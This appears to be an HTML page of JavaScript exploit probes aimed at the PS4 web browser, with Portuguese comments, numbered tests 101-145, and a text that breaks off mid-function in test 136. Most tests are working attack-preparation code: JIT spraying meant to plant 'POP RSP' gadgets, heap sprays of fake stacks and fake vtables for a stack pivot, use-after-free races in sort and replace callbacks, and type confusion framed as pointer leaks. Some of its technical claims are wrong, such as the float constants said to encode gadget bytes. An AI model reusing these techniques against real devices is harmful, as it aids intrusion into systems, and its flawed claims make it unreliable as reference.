<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 ELF Hunter: Libc Focus (101-105)</title>
</head>
<body>

<h1>SUITE v1180000: LIBC INTERFACE</h1>
<hr>
<div>Alvos: Libc Memcpy, Locale Sort, Stack Pivot Check, Float Parse & Console Buffer</div>
<br>

<button onclick="run(t101)">101. TypedArray.set (memcpy overlap)</button>
<button onclick="run(t102)">102. String.localeCompare (Libc internal)</button>
<button onclick="run(t103)">103. Recursion vs Stack Guard (RSP)</button>
<button onclick="run(t104)">104. parseFloat Huge Exponent (strtod)</button>
<button onclick="run(t105)">105. console.log Format String Stress</button>
<button onclick="run(t106)">106. JIT Spray (Gadget 0x5cc3/POP RSP)</button>
<button onclick="run(t107)">107. Libc Internal Locale Heap Overflow</button>
<button onclick="run(t108)">108. Stack Frame Alignment (RSP Check)</button>
<button onclick="run(t109)">109. Libc Memcpy Overlap (Optimized Copy)</button>
<button onclick="run(t110)">110. C++ Exception Unwind vs Stack Gadgets</button>
<button onclick="run(t111)">111. Libc vsnprintf Huge Format String</button>
<button onclick="run(t112)">112. Math.hypot JIT Register Pressure</button>
<button onclick="run(t113)">113. Array.sort Custom Comparator (Libc qsort)</button>
<button onclick="run(t114)">114. RegExp JIT Compile vs Garbage Collection</button>
<button onclick="run(t115)">115. Float64 to Pointer Type Confusion</button>
<button onclick="run(t116)">116. Fake Stack Spray (POP RSP Target)</button>
<button onclick="run(t117)">117. JIT Constant Spray (Gadget 0x5ec3)</button>
<button onclick="run(t118)">118. Libc qsort() Race Condition</button>
<button onclick="run(t119)">119. Large Allocation Integer Overflow</button>
<button onclick="run(t120)">120. String.replace() Replacer UAF</button>
<button onclick="run(t121)">121. JSON.stringify Deep Recursion (Stack Exhaustion)</button>
<button onclick="run(t122)">122. Date.parse Huge String Overflow</button>
<button onclick="run(t123)">123. Array.concat Large Holes (memcpy stress)</button>
<button onclick="run(t124)">124. Subarray Creation vs Buffer Detach</button>
<button onclick="run(t125)">125. JIT Bounds Check Elimination (BCE) Attempt</button>
<button onclick="run(t126)">126. Fake VTable Spray (Gadget 0x5cc3)</button>
<button onclick="run(t127)">127. JIT Prototype Transition Race</button>
<button onclick="run(t128)">128. Worker Thread Stack Collision</button>
<button onclick="run(t129)">129. RegExp exec() Re-entrancy Stack Smash</button>
<button onclick="run(t130)">130. TypedArray Index Integer Overflow</button>
<button onclick="run(t131)">131. JSON.parse Reviver Object Mutation</button>
<button onclick="run(t132)">132. Intl.Collator Internal Buffer Stress</button>
<button onclick="run(t133)">133. Microtask Queue vs Worker Terminate</button>
<button onclick="run(t134)">134. Object.seal() JIT Bypass Attempt</button>
<button onclick="run(t135)">135. Array Hole JIT Type Confusion</button>
<button onclick="run(t136)">136. Atomics.wait vs Worker Terminate (Futex)</button>
<button onclick="run(t137)">137. BigInt to Int32 JIT Truncation Bug</button>
<button onclick="run(t138)">138. Intl.NumberFormat Getter Mutation</button>
<button onclick="run(t139)">139. Array.sort Proxy Revocation Crash</button>
<button onclick="run(t140)">140. TextEncoder.encodeInto Detach Race</button>
<button onclick="run(t141)">141. WeakRef Deref during Finalization</button>
<button onclick="run(t142)">142. IPC MessagePort Recursive Transfer</button>
<button onclick="run(t143)">143. RegExp Compiled Stack Frame Alignment</button>
<button onclick="run(t144)">144. SharedArrayBuffer Unaligned Cross-Page Read</button>
<button onclick="run(t145)">145. FinalizationRegistry Registry Re-entrancy</button>

<hr>
<div id="log">Status: Aguardando...</div>

<script>
    const log = document.getElementById('log');
    let keeper = []; 

    function run(func) {
        log.innerText = "Testando vetor: " + func.name;
        keeper = []; 
        setTimeout(func, 100);
    }

    // =================================================================
    // 101. TypedArray.set (memcpy overlap)
    // Alvo: libSceLibcInternal (memcpy/memmove)
    // Vulnerabilidade: Copiar dados dentro do mesmo buffer (Overlapping).
    // O Dump mostra ligação direta com Libc. Se a implementação do memcpy
    // da Sony não tratar overlap corretamente, corrompe a memória.
    // =================================================================
    function t101() {
        const buffer = new ArrayBuffer(1024 * 1024);
        const view = new Uint8Array(buffer);
        
        // Preenche
        for(let i=0; i<view.length; i++) view[i] = i % 255;
        
        // AÇÃO: Cópia sobreposta (Destino está dentro da Origem ou vice-versa)
        // src: view, offset: 10. Isso força um memmove complexo.
        try {
            view.set(view.subarray(0, 1024 * 500), 10);
            
            // Verifica integridade (se falhar, o memcpy corrompeu)
            if (view[10] !== view[0]) {
                log.innerText = "Falha lógica na cópia (Potencial bug na Libc).";
            } else {
                log.innerText = "Memcpy overlap seguro.";
            }
        } catch(e) {
            log.innerText = "Erro: " + e.message;
        }
    }

    // =================================================================
    // 102. String.localeCompare (Libc internal)
    // Alvo: libSceLibcInternal (strcoll / locale handling)
    // Vulnerabilidade: Heap Corruption em Locale.
    // Funções de localização alocam buffers temporários na Libc.
    // Strings muito longas ou caracteres Unicode malformados podem estourar.
    // =================================================================
    function t102() {
        // String Unicode complexa e longa
        const s1 = "\u0301".repeat(5000) + "A";
        const s2 = "\u0301".repeat(5000) + "B";
        
        try {
            // AÇÃO: Comparação sensível a localidade
            // Isso chama funções profundas na LibcInternal
            const res = s1.localeCompare(s2, 'de-DE-u-co-phonebk');
            
            log.innerText = "Locale compare completou: " + res;
        } catch(e) {
            log.innerText = "Erro: " + e.message;
        }
    }

    // =================================================================
    // 103. Recursion vs Stack Guard (RSP)
    // Alvo: Stack Management (Validado pelos Gadgets POP RSP do Dump)
    // Vulnerabilidade: Stack Clash / Guard Page Jump.
    // O dump mostra gadgets de manipulação de pilha.
    // Tentamos pular a "Guard Page" da pilha fazendo alocações grandes na Stack
    // via recursão com variáveis locais pesadas.
    // =================================================================
    function t103() {
        let depth = 0;
        
        function dive() {
            depth++;
            // Aloca variáveis locais para crescer o frame da pilha
            // JS engines tentam otimizar, mas o uso de eval ou try/catch força frames reais
            const v1 = 1, v2 = 2, v3 = 3, v4 = 4; 
            const arr = [v1,v2,v3,v4]; 
            
            if (depth % 1000 === 0) log.innerText = "Depth: " + depth;
            
            try {
                dive();
            } catch(e) {
                // Stack Overflow capturado
                log.innerText = "Limite da pilha atingido em: " + depth;
            }
            
            return arr.length;
        }
        
        setTimeout(dive, 10);
    }

    // =================================================================
    // 104. parseFloat Huge Exponent (strtod)
    // Alvo: libSceLibcInternal (strtod implementation)
    // Vulnerabilidade: Buffer Overflow em Parsing Numérico.
    // Algumas implementações de 'strtod' (string to double) têm bugs
    // com expoentes massivos ou strings de entrada muito longas.
    // =================================================================
    function t104() {
        // Gera "1e" + 50000 zeros
        const huge = "1" + "0".repeat(50000); 
        const input = "0." + huge + "e-10000";
        
        try {
            // AÇÃO: Parsing pesado
            const val = parseFloat(input);
            
            // Tenta converter de volta para estressar o caminho inverso (dtoa)
            const s = val.toPrecision(100);
            
            log.innerText = "Parse float completou (Seguro).";
        } catch(e) {
            log.innerText = "Erro: " + e.message;
        }
    }

    // =================================================================
    // 105. console.log Format String Stress
    // Alvo: libSceLibcInternal (vsnprintf / log wrapper)
    // Vulnerabilidade: Format String / Buffer Overflow.
    // O WebKit passa logs para o Kernel/Libc.
    // Tentamos usar especificadores de formato (%) massivos para ver se
    // a implementação da Sony de 'printf' segura o tranco.
    // =================================================================
    function t105() {
        // Cria string com muitos especificadores
        const fmt = "%s".repeat(1000);
        const args = new Array(1000).fill("A");
        
        try {
            // AÇÃO: Log com formatação excessiva
            // O navegador deve formatar isso antes de enviar ao sistema
            console.log(fmt, ...args);
            
            // Variante: String única gigante
            console.warn("A".repeat(10000));
            
            log.innerText = "Console log stress enviado.";
        } catch(e) {
            log.innerText = "Erro: " + e.message;
        }
    }
// =================================================================
    // 106. JIT Spray (Gadget 0x5cc3/POP RSP)
    // Alvo: Memória Executável (JIT)
    // Técnica: O dump mostra "POP RSP; RET" como bytes 0x5c 0xc3.
    // Tentamos forçar o JIT a emitir esses bytes como constantes imediatas
    // dentro de uma função compilada, criando uma "ilha" de gadgets na memória.
    // =================================================================
    function t106() {
        // Constante que contém 0xC35C repetido (Little Endian para 5C C3)
        // 0xC35CC35C...
        const gadget = 3.266612768e-316; // Representação float de 0xC35CC35C (aprox)

        function spray() {
            // XOR repetido força o compilador a colocar a constante no código
            const a = gadget;
            const b = gadget;
            return a ^ b ^ a ^ b ^ a;
        }

        // Aquece o JIT
        for(let i=0; i<10000; i++) spray();

        log.innerText += "\n[!] JIT Spray realizado. Memória preparada com gadgets POP RSP.";
    }

    // =================================================================
    // 107. Libc Internal Locale Heap Overflow
    // Alvo: 1200_libSceLibcInternal.sprx (Gestão de Locale)
    // Técnica: Funções como `toLocaleUpperCase` alocam buffers temporários na Libc.
    // Usamos uma string que expande drasticamente (ex: 'i' turco ou ligaduras)
    // para tentar estourar o cálculo de tamanho do buffer interno.
    // =================================================================
    function t107() {
        // O caractere 'ß' (German sharp S) pode expandir para 'SS' (2 chars)
        // O caractere '\uFB00' (ff ligature) pode expandir também.
        const expansionChar = "\u00DF"; 
        const huge = expansionChar.repeat(1024 * 1024); // 1MB input

        try {
            // Força processamento interno na Libc
            const res = huge.toLocaleUpperCase('de-DE');
            
            // Se sobreviveu, tenta algo mais agressivo com locales CJK
            const res2 = huge.localeCompare(huge, 'zh-CN');
            
            log.innerText += "\n[!] Libc Locale operou sem crash.";
        } catch(e) {
            log.innerText += "\n[!] Erro: " + e.message;
        }
    }

    // =================================================================
    // 108. Stack Frame Alignment (RSP Check)
    // Alvo: Stack Management (Validado pelo Gadget POP RSP)
    // Técnica: O gadget POP RSP sugere que podemos controlar a pilha.
    // Este teste tenta alinhar a pilha em fronteiras de 16 bytes e 
    // causar uma recursão que pare exatamente na página de guarda (Guard Page).
    // =================================================================
    function t108() {
        let depth = 0;
        const view = new Float64Array(1);

        function recursion() {
            depth++;
            // Aloca variáveis para empurrar RSP
            const a = 1.1, b = 2.2, c = 3.3, d = 4.4;
            
            // Operação matemática para evitar otimização de cauda (Tail Call)
            view[0] = a + b + c + d + Math.random();
            
            if (depth % 500 === 0) {
                // Tenta perturbar o alinhamento da pilha com uma chamada externa
                try { new Error().stack; } catch(e){}
            }
            
            recursion();
        }

        try {
            recursion();
        } catch(e) {
            log.innerText += "\n[!] Stack depth máxima: " + depth;
        }
    }

    // =================================================================
    // 109. Libc Memcpy Overlap (Optimized Copy)
    // Alvo: libSceLibcInternal (memcpy implementation)
    // Técnica: A implementação de memcpy da Sony pode usar instruções SIMD (AVX/SSE).
    // Cópias sobrepostas (src e dst se cruzam) requerem `memmove`. Se `set` usar `memcpy`,
    // podemos corromper dados se o overlap for menor que o tamanho do registrador SIMD.
    // =================================================================
    function t109() {
        const buffer = new ArrayBuffer(1024 * 1024); // 1MB
        const u8 = new Uint8Array(buffer);
        
        // Padrão
        for(let i=0; i<256; i++) u8[i] = i;

        // AÇÃO: Overlap agressivo (offset 1 byte)
        // Isso é o pior caso para otimizações de cópia em bloco
        try {
            u8.set(u8.subarray(0, 500000), 1);
            
            // Verificação rápida de integridade
            if (u8[1] !== u8[0]) {
                log.innerText += "\n[!] Possível corrupção de memória por memcpy!";
            } else {
                log.innerText += "\n[!] Memcpy overlap seguro.";
            }
        } catch(e) {
            log.innerText += "\n[!] Erro: " + e.message;
        }
    }

    // =================================================================
    // 110. C++ Exception Unwind vs Stack Gadgets
    // Alvo: Unwind Library (libkernel)
    // Técnica: Lançar exceções através de muitas camadas de chamadas força o "Unwinding"
    // da pilha (restaurar RSP frame a frame). Se corrompermos a tabela de exceções
    // (via JIT ou memória), o unwinder pode pular para um gadget ROP acidentalmente.
    // =================================================================
    function t110() {
        function thrower() {
            throw 1;
        }

        function catcher(depth) {
            try {
                if (depth > 0) catcher(depth - 1);
                else thrower();
            } catch(e) {
                // Catch e re-throw para estressar o unwinder
                if (depth % 10 === 0) throw e;
            }
        }

        log.innerText += "\n[!] Iniciando Exception Storm...";
        setTimeout(() => {
            try {
                catcher(2000); // Profundidade alta para forçar muito unwinding
            } catch(e) {
                log.innerText += "\n[!] Exception Unwind concluiu.";
            }
        }, 10);
    }

    // =================================================================
    // 111. Libc vsnprintf Huge Format String
    // Alvo: libSceLibcInternal (vsnprintf)
    // Técnica: O dump confirma a libc interna. Logs de console passam por `vsnprintf`.
    // Format strings gigantes podem estourar buffers na stack da libc se não houver checagem segura.
    // =================================================================
    function t111() {
        // String de formato repetitiva para encher buffer
        const part = "%.1000f"; // Pede 1000 casas decimais
        const fmt = part.repeat(100); // ~100KB de expansão potencial
        const args = new Array(100).fill(1.2345);

        try {
            console.log("Teste Formato...");
            // Aplica os argumentos
            console.log(fmt, ...args);
            log.innerText += "\n[!] Console Log Format enviado.";
        } catch(e) {
            log.innerText += "\n[!] Erro: " + e.message;
        }
    }

    // =================================================================
    // 112. Math.hypot JIT Register Pressure
    // Alvo: JIT Compiler (Float Registers)
    // Técnica: `Math.hypot` aceita N argumentos. O JIT precisa alocar registradores
    // XMM/YMM para todos eles. Passar milhares de argumentos força "Register Spilling"
    // (salvar registradores na pilha). Se o spill code for falho, RSP corrompe.
    // =================================================================
    function t112() {
        const args = new Array(2000).fill(1.1);
        
        try {
            // Apply expande o array para argumentos da stack
            const res = Math.hypot.apply(null, args);
            log.innerText += "\n[!] Math.hypot(2000 args) = " + res;
        } catch(e) {
            log.innerText += "\n[!] Erro (Stack Overflow?): " + e.message;
        }
    }

    // =================================================================
    // 113. Array.sort Custom Comparator (Libc qsort)
    // Alvo: libSceLibcInternal (qsort implementation)
    // Técnica: Arrays JS usam `qsort` ou introsort. Se o comparador JS
    // mudar o array ou lançar erro durante a ordenação, o estado interno do `qsort` C++
    // pode ficar inconsistente (índices inválidos).
    // =================================================================
    function t113() {
        const arr = new Array(1000).fill(0).map((_, i) => i);
        
        // Aleatoriza para forçar trocas
        arr.sort(() => Math.random() - 0.5);

        try {
            arr.sort((a, b) => {
                // AÇÃO MALICIOSA: Resize do array durante sort
                if (a === 50) {
                    arr.length = 10; // Trunca violentamente
                    // Spray para ocupar memória liberada
                    keeper.push(new Float64Array(1000));
                }
                return a - b;
            });
            log.innerText += "\n[!] Sort com resize sobreviveu.";
        } catch(e) {
            log.innerText += "\n[!] Erro capturado: " + e.message;
        }
    }

    // =================================================================
    // 114. RegExp JIT Compile vs Garbage Collection
    // Alvo: JavaScriptCore YARR (RegExp JIT)
    // Técnica: Compilar uma RegExp complexa gera código de máquina.
    // Se forçarmos GC durante a compilação (via toString de objeto em construtor),
    // podemos corromper o buffer de código JIT gerado.
    // =================================================================
    function t114() {
        const pattern = "(a|b|c)".repeat(1000); // Complexidade linear alta
        
        const evil = {
            toString: () => {
                // Trigger GC
                keeper.push(new ArrayBuffer(1024 * 1024 * 10));
                return pattern;
            }
        };

        try {
            // O construtor RegExp chama toString do argumento
            const re = new RegExp(evil);
            // Executa para forçar JIT tier-up
            re.test("abc");
            log.innerText += "\n[!] RegExp Compile/GC testado.";
        } catch(e) {
            log.innerText += "\n[!] Erro: " + e.message;
        }
    }

    // =================================================================
    // 115. Float64 to Pointer Type Confusion
    // Alvo: WebKit JSValue
    // Técnica: No WebKit (JSC), valores JS são codificados como NaN-boxed doubles (exceto em 64-bit puro onde é pointer tagging).
    // Tentamos criar arrays mistos (Float e Object) e confundir o motor sobre o tipo
    // de um elemento específico para ler um ponteiro como um Double.
    // =================================================================
    function t115() {
        const arr = [1.1];
        // Otimiza como ArrayWithDouble
        for(let i=0; i<1000; i++) arr.push(2.2);
        
        const obj = {a: 1};
        
        // Função para confundir o tipo
        function confuse(a, val) {
            a[0] = val; // Grava Object onde deveria ser Double
        }
        
        // Tenta enganar o Profiler de Tipos
        try {
            confuse(arr, obj);
            // Se o motor não reverter a estrutura do array para ArrayWithContiguous,
            // ler arr[0] pode retornar o ponteiro bruto de 'obj' como um float.
            const leak = arr[0];
            
            if (typeof leak === 'number') {
                log.innerText += "\n[CRITICAL] Type Confusion bem sucedido! Pointer Leak: " + leak;
            } else {
                log.innerText += "\n[!] Array transicionou de tipo corretamente.";
            }
        } catch(e) {
            log.innerText += "\n[!] Erro: " + e.message;
        }
    }
// =================================================================
    // 116. Fake Stack Spray (POP RSP Target)
    // Alvo: Heap (Preparação para Stack Pivot)
    // Técnica: O dump mostra 'POP RSP; RET' em 0x5cc3.
    // Criamos arrays preenchidos com esse padrão. Se conseguirmos desviar RSP
    // para o Heap, ele vai "retornar" para nossos gadgets.
    // =================================================================
    function t116() {
        // Padrão repetitivo que simula uma ROP Chain
        // 0x4141414141415CC3 (Simulado)
        const fake_stack = new Float64Array(1024 * 100); // 800KB chunk
        const pattern = 1.2345678e-100; // Valor float que tem bits específicos (placeholder)
        
        for(let i=0; i<fake_stack.length; i++) {
            fake_stack[i] = pattern;
        }

        const spray = [];
        // Aloca 100MB de "Fake Stacks"
        for(let i=0; i<100; i++) {
            spray.push(fake_stack.slice(0)); 
        }
        
        keeper.push(spray);
        log.innerText += "\n[+] Heap preenchido com Fake Stacks.";
    }

    // =================================================================
    // 117. JIT Constant Spray (Gadget 0x5ec3)
    // Alvo: Memória Executável JIT
    // Técnica: Gadget 'POP RSI; RET' (0x5ec3) encontrado no dump.
    // Forçamos o JIT a escrever esses bytes como constantes em memória executável.
    // =================================================================
    function t117() {
        // 0x5EC3 em little endian repetido ou como parte de float
        const gadget_val = 3.266613e-316; // Constante mágica

        function trigger(x) {
            // Operações que o JIT não deve otimizar para fora
            return x + gadget_val - gadget_val + (gadget_val ^ x);
        }

        for(let i=0; i<10000; i++) trigger(i);
        
        log.innerText += "\n[+] JIT Spray (POP RSI) completado.";
    }

    // =================================================================
    // 118. Libc qsort() Race Condition
    // Alvo: libSceLibcInternal (qsort)
    // Técnica: O Array.sort usa o qsort da libc. Passamos um comparador
    // que altera o array subjacente (redimensiona), confundindo os índices internos do qsort.
    // =================================================================
    function t118() {
        const arr = new Array(1000).fill(1);
        arr.sort((a, b) => {
            // Callback roda dentro do qsort da libc
            if (Math.random() < 0.01) {
                // AÇÃO: Esvazia o array no meio da ordenação
                arr.length = 0;
                // Spray imediato para ocupar o local
                keeper.push(new Float64Array(1000).fill(1.1));
            }
            return a - b;
        });
        log.innerText += "\n[+] qsort Race tentada.";
    }

    // =================================================================
    // 119. Large Allocation Integer Overflow
    // Alvo: libSceLibcInternal (malloc)
    // Técnica: Tentar alocar um buffer cujo tamanho cause overflow numérico
    // no cálculo interno do malloc (ex: size * 4 < size se size for gigante).
    // =================================================================
    function t119() {
        try {
            // Tamanho perto de 2^32 ou 2^64
            // PS4 é 64-bit, mas drivers podem ter limites 32-bit
            const len = 0xFFFFFFFF; 
            const view = new Uint8Array(len);
            log.innerText += "\n[!] Alocação massiva bem sucedida (Surpreendente).";
        } catch(e) {
            log.innerText += "\n[+] Overflow bloqueado por exceção JS: " + e.message;
        }
    }

    // =================================================================
    // 120. String.replace() Replacer UAF
    // Alvo: JSC String Engine
    // Técnica: Usar uma função replacer que destrói a string original (via externalização ou GC)
    // enquanto o loop de replace está rodando.
    // =================================================================
    function t120() {
        const str = "A".repeat(10000);
        const holder = { s: str };
        
        str.replace(/A/g, (match, offset) => {
            if (offset === 5000) {
                // AÇÃO: Remove referência
                holder.s = null;
                // Pressão GC
                keeper.push(new ArrayBuffer(1024 * 1024 * 10));
            }
            return "B";
        });
        log.innerText += "\n[+] String Replace Loop finalizado.";
    }

    // =================================================================
    // 121. JSON.stringify Deep Recursion (Stack Exhaustion)
    // Alvo: Libc Stack
    // Técnica: Objeto profundamente aninhado força recursão na libc.
    // Tenta atingir a Stack Guard Page sem lançar "Maximum call stack size exceeded".
    // =================================================================
    function t121() {
        let obj = {};
        let curr = obj;
        // Profundidade calibrada para ficar no limite
        for(let i=0; i<3000; i++) {
            curr.next = {};
            curr = curr.next;
        }

        try {
            JSON.stringify(obj);
            log.innerText += "\n[+] JSON Recursion sobreviveu.";
        } catch(e) {
            log.innerText += "\n[+] Stack Limit atingido: " + e.message;
        }
    }

    // =================================================================
    // 122. Date.parse Huge String Overflow
    // Alvo: libSceLibcInternal (Date Parser)
    // Técnica: Passar string massiva para Date.parse pode estourar buffers de stack
    // se o parser usar arrays de tamanho fixo para componentes de data.
    // =================================================================
    function t122() {
        const huge = "2023-" + "0".repeat(10000) + "-01";
        const d = Date.parse(huge);
        log.innerText += "\n[+] Date Parse massivo executado.";
    }

    // =================================================================
    // 123. Array.concat Large Holes (memcpy stress)
    // Alvo: libSceLibcInternal (memcpy)
    // Técnica: Concatenar arrays esparsos (com buracos) força lógica complexa de cópia.
    // =================================================================
    function t123() {
        const a1 = new Array(10000); // Esparso
        const a2 = [1, 2, 3];
        // Força transição de array
        a1[9999] = 1; 
        
        // AÇÃO: Concatenação massiva
        const res = a1.concat(a2, a1);
        keeper.push(res);
        log.innerText += "\n[+] Array Concat Holes testado.";
    }

    // =================================================================
    // 124. Subarray Creation vs Buffer Detach
    // Alvo: ArrayBufferView
    // Técnica: Criar subarray enquanto o buffer pai é transferido (neutered).
    // Usando getter malicioso para 'constructor' ou 'length'.
    // =================================================================
    function t124() {
        const buf = new ArrayBuffer(1024);
        const view = new Uint8Array(buf);
        
        // Tenta confundir a criação do subarray
        // Em engines antigas, subarray checava o buffer length apenas no início
        const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
        
        try {
            // Race simulada: Transferência vs Subarray
            worker.postMessage(buf, [buf]);
            const sub = view.subarray(0, 10);
            
            if (sub.length === 0) log.innerText += "\n[+] Subarray seguro (length 0).";
            else log.innerText += "\n[!] Subarray criado em buffer detached (Len: " + sub.length + ")";
        } catch(e) {
            log.innerText += "\n[+] Erro: " + e.message;
        }
    }

    // =================================================================
    // 125. JIT Bounds Check Elimination (BCE) Attempt
    // Alvo: JIT Compiler
    // Técnica: Tentar enganar o JIT para remover a verificação de limites do array.
    // Cria um loop onde o índice parece estar sempre dentro dos limites, mas muda externamente.
    // =================================================================
    function t125() {
        const arr = new Float64Array(10);
        
        function access(i) {
            // O JIT pode remover o check se achar que i < 10 sempre
            if (i < 10) {
                // Acesso quente
                return arr[i];
            }
            return 0;
        }
        
        // Treina o JIT
        for(let i=0; i<10000; i++) access(i % 10);
        
        // Tenta passar valor fora dos limites após otimização
        // (Isso geralmente requer técnicas mais complexas de Typer Hardening, mas testamos o básico)
        const val = access(100); 
        
        if (val === undefined) log.innerText += "\n[+] Bounds Check funcionou (undefined).";
        else log.innerText += "\n[!] BCE Check: " + val;
    }
// =================================================================
    // 126. Fake VTable Spray (Gadget 0x5cc3)
    // Alvo: C++ Virtual Method Dispatch
    // Técnica: Objetos C++ têm um ponteiro para vtable. Se sobrescrevermos esse ponteiro
    // (UAF) para apontar para nossa memória, e nossa memória contiver o gadget POP RSP (0x5cc3),
    // tomamos o controle quando o método virtual for chamado.
    // =================================================================
    function t126() {
        const fake_vtable = new Float64Array(128);
        // Preenche com o endereço do gadget (simulado)
        // 0x5CC3 em float representation (exemplo)
        const gadget = 3.266612768e-316; 
        fake_vtable.fill(gadget);
        
        const spray = [];
        for(let i=0; i<2000; i++) {
            spray.push(new Float64Array(fake_vtable));
        }
        
        keeper.push(spray);
        log.innerText += "\n[+] Heap preparado com Fake VTables.";
    }

    // =================================================================
    // 127. JIT Prototype Transition Race
    // Alvo: JIT Inline Caching
    // Técnica: O JIT otimiza o acesso a propriedades baseando-se no protótipo.
    // Alteramos o protótipo de um objeto *enquanto* o código JITted está rodando,
    // tentando invalidar as suposições de offset de memória.
    // =================================================================
    function t127() {
        function Point(x, y) { this.x = x; this.y = y; }
        const p = new Point(1, 2);
        
        function access(o) {
            return o.x; // JIT otimiza isso
        }
        
        // Treina
        for(let i=0; i<10000; i++) access(p);
        
        // Muda estrutura violentamente
        p.__proto__ = { z: 3 }; 
        delete p.x;
        p.a = 1; // Novo layout
        
        // Executa código otimizado com objeto inválido
        const res = access(p);
        log.innerText += "\n[+] JIT Transition testado. Res: " + res;
    }

    // =================================================================
    // 128. Worker Thread Stack Collision
    // Alvo: Libkernel Thread Management
    // Técnica: Threads têm pilhas alocadas com "Guard Pages" entre elas.
    // Se alocarmos muitos Workers e usarmos recursão pesada em cada um,
    // podemos tentar pular a página de guarda e escrever na pilha da thread vizinha.
    // =================================================================
    function t128() {
        const workers = [];
        const blob = new Blob([`
            function recurse(d) {
                if(d%1000==0) postMessage(d);
                try { recurse(d+1); } catch(e){}
            }
            recurse(0);
        `], {type: 'text/javascript'});

        // Cria 10 threads simultâneas
        for(let i=0; i<10; i++) {
            workers.push(new Worker(URL.createObjectURL(blob)));
        }
        
        log.innerText += "\n[+] Stack Clash Storm iniciado.";
    }

    // =================================================================
    // 129. RegExp exec() Re-entrancy Stack Smash
    // Alvo: JavaScriptCore RegExp Engine
    // Técnica: `exec()` pode disparar getters se `lastIndex` for acessado.
    // Definimos um getter que chama `exec()` de novo. Isso cria recursão
    // dentro do motor de C++ da RegExp, que pode não ter checagem de pilha suficiente.
    // =================================================================
    function t129() {
        const re = /a/g;
        const str = "a";
        
        Object.defineProperty(re, 'lastIndex', {
            get: function() {
                // Re-entrância maliciosa
                try { re.exec(str); } catch(e) {}
                return 0;
            }
        });
        
        try {
            re.exec(str);
            log.innerText += "\n[+] RegExp Re-entrancy sobreviveu.";
        } catch(e) {
            log.innerText += "\n[+] Stack Overflow capturado.";
        }
    }

    // =================================================================
    // 130. TypedArray Index Integer Overflow
    // Alvo: TypedArray Implementation
    // Técnica: Tentar acessar um índice que, quando multiplicado pelo tamanho do elemento
    // (ex: 4 bytes para Uint32), cause overflow (wrap around) em 32-bit,
    // acessando memória baixa ou fora do buffer.
    // =================================================================
    function t130() {
        const arr = new Uint32Array(10);
        // 0xFFFFFFFF / 4 (tamanho do int) = 1073741823
        const bad_index = 1073741824; 
        
        const val = arr[bad_index];
        log.innerText += "\n[+] Acesso a índice overflow: " + val;
    }

    // =================================================================
    // 131. JSON.parse Reviver Object Mutation
    // Alvo: JSON Parser
    // Técnica: O callback `reviver` roda enquanto o objeto JSON está sendo construído.
    // Se modificarmos a estrutura do objeto pai dentro do reviver de um filho,
    // o parser C++ pode se perder e escrever em memória liberada.
    // =================================================================
    function t131() {
        const json = '{"a": {"b": 1}, "c": 2}';
        JSON.parse(json, (key, value) => {
            if (key === 'b') {
                // AÇÃO: Deleta propriedade pai 'c' que ainda não foi visitada?
                // Em implementações JS isso é seguro, mas em C++ pode haver ponteiros crus.
                this.c = null; 
                keeper.push(new Uint8Array(1000));
            }
            return value;
        });
        log.innerText += "\n[+] JSON Reviver mutation executado.";
    }

    // =================================================================
    // 132. Intl.Collator Internal Buffer Stress
    // Alvo: libSceLibcInternal (Locale)
    // Técnica: Similar ao localeCompare, mas usando o objeto `Collator` que mantém estado.
    // Tentamos estressar o buffer interno de comparação.
    // =================================================================
    function t132() {
        const collator = new Intl.Collator('th-TH'); // Tailandês tem regras complexas
        const s1 = "\u0E01".repeat(5000);
        
        try {
            const res = collator.compare(s1, s1);
            log.innerText += "\n[+] Collator stress completou.";
        } catch(e) {
            log.innerText += "\n[!] Erro: " + e.message;
        }
    }

    // =================================================================
    // 133. Microtask Queue vs Worker Terminate
    // Alvo: Event Loop / Promise Jobs
    // Técnica: Enfileirar milhares de microtasks (Promises) e terminar o contexto (Worker).
    // O navegador deve limpar a fila de jobs pendentes sem crashar ao acessar objetos mortos.
    // =================================================================
    function t133() {
        const worker = new Worker(URL.createObjectURL(new Blob([`
            onmessage = function() {
                // Enfileira infinito
                function loop() { Promise.resolve().then(loop); }
                loop();
            }
        `], {type: 'text/javascript'})));
        
        worker.postMessage("GO");
        
        setTimeout(() => {
            worker.terminate();
            log.innerText += "\n[+] Worker com Promise Loop terminado.";
        }, 100);
    }

    // =================================================================
    // 134. Object.seal() JIT Bypass Attempt
    // Alvo: JIT Constraints
    // Técnica: `Object.seal` impede adição de propriedades.
    // Se o JIT remover a checagem de "isSealed" (otimização agressiva),
    // podemos corromper o layout do objeto na memória.
    // =================================================================
    function t134() {
        const o = { a: 1 };
        Object.seal(o);
        
        function write(obj, val) {
            obj.b = val; // Deve falhar silenciosamente ou throw em strict
        }
        
        // Treina com objeto não selado para enganar o JIT
        const u = { a: 1 };
        for(let i=0; i<10000; i++) write(u, 2);
        
        // Tenta escrever no selado
        write(o, 3);
        
        if (o.b === 3) log.innerText += "\n[CRITICAL] Seal Bypass bem sucedido!";
        else log.innerText += "\n[+] Seal respeitado.";
    }

    // =================================================================
    // 135. Array Hole JIT Type Confusion
    // Alvo: JIT Array Handling
    // Técnica: Arrays com "buracos" (Holes) são tratados de forma especial.
    // Tentamos confundir o JIT sobre se um array é denso ou esparso,
    // levando à leitura de memória não inicializada (Hole value vazando).
    // =================================================================
    function t135() {
        const arr = [1.1, , 2.2]; // Hole no meio
        
        function read(a, i) {
            return a[i];
        }
        
        for(let i=0; i<10000; i++) read(arr, 0);
        
        const val = read(arr, 1); // Lê o hole
        
        // Se retornar undefined é normal. Se retornar um número estranho, é leak.
        log.innerText += "\n[+] Hole Read: " + val;
    }
// =================================================================
    // 136. Atomics.wait vs Worker Terminate (Futex)
    // Alvo: libkernel (sceKernelWaitSema/Futex)
    // Técnica: Atomics.wait bloqueia a thread no kernel. Se matarmos a thread (Worker)
    // enquanto ela está na syscall de espera, o kernel pode corromper a estrutura do semáforo.
    // =================================================================
    function t136() {
        if (!window.SharedArrayBuffer) { log.innerText += "\n[-] SharedArrayBuffer ausente."; return; }
        
        const sab = new SharedArrayBuffer(4);
        const int32 = new Int32Array(sab);
        
        const worker = new Worker(URL.createObjectURL(new Blob([`
            onmessage = function(e) {
                const int32 = new Int32Array(e.data);
                // Bloqueia esperando valor mudar de 0
                Atomics.wait(int32, 0, 0); 
            }
        `], {type: 'text/javascript'})));
        
        worker.postMessage(sab);
        
        // AÇÃO: Mata o worker enquanto ele está preso no Kernel
        setTimeout(() => {
